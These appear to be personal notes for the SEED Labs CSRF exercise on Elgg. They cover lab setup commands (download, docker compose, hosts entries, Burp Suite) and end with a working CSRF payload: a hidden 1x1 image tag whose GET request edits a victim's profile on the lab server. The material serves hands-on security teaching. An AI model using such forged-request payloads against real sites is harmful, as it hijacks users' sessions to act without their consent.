# CSRF

# Definition
Cross-site request forgery (CSRF) is a type of attack that occurs when a malicious web page causes a user's browser to perform an unwanted action on a trusted site

# Lab creation
```bash
wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip

unzip Labsetup.zip
rm !$

cd Labsetup
sudo docker compose up -d

cat /etc/hosts
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.0.105 www.attacker32.com

ping -c 1 www.seed-server.com
ping -c 1 www.example32.com
ping -c 1 www.attacker32.com

# Change name profile and catch post with BUrpsuite
<>
burpsuite >& /dev/null & disown

# Quit tokens until name var and change request by GET
<img src="http://www.seed-server.com/action/profile/edit?name=Edibauer&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56" alt="image" width="1" height="1"/>




```
